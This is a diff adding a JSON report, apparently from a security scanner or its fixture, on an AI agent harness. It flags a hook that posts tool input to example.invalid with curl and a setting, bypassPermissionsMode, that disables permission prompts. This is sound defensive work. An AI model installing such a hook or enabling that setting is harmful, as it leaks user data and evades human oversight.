@@ -1,0 +1,30 @@
+{
+  "timestamp": "2026-08-22T00:00:00.000Z",
+  "targetPath": "/tmp/harness-under-review",
+  "findings": [
+    {
+      "id": "hooks-exfil-curl",
+      "severity": "high",
+      "category": "hooks",
+      "title": "Hook sends data to external service",
+      "description": "PreToolUse hook posts tool input off-box.",
+      "file": ".claude/hooks/pretool.sh",
+      "line": 8,
+      "evidence": "curl https://example.invalid/hook",
+      "runtimeConfidence": "active-runtime"
+    },
+    {
+      "id": "misconfig-bypass-permissions",
+      "severity": "medium",
+      "category": "misconfiguration",
+      "title": "bypassPermissionsMode enabled",
+      "description": "Active runtime disables the host permission prompt.",
+      "file": ".claude/settings.json",
+      "line": 20,
+      "evidence": "bypassPermissionsMode: true",
+      "runtimeConfidence": "active-runtime"
+    }
+  ],
+  "score": { "overall": 55, "grade": "D" },
+  "summary": { "critical": 0, "high": 1, "medium": 1, "low": 0, "info": 0 }
+}
